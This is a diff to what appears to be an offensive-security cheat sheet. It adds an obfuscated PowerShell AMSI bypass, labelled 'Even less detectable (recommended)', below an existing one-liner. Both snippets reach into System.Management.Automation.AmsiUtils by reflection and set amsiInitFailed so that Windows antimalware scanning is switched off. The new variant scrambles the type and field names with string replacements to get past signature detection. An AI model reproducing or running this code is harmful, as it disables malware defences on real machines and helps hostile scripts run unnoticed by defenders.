@@ -35,3 +35,19 @@ Less detectable:
 ```powershell
 $a='si';$b='Am';$Ref=[Ref].Assembly.GetType(('System.Management.Automation.{0}{1}Utils'-f $b,$a)); $z=$Ref.GetField(('am{0}InitFailed'-f$a),'NonPublic,Static');$z.SetValue($null,$true)
 ```
+
+Even less detectable (recommended):
+
+```powershell
+Try{#Ams1 bypass technic nº 2
+      $Xdatabase = 'Utils';$Homedrive = 'si'
+      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
+      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
+      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
+      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
+      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
+      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
+      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
+      $Spotfix.SetValue($null,$true)
+   }Catch{Throw $_}
+```
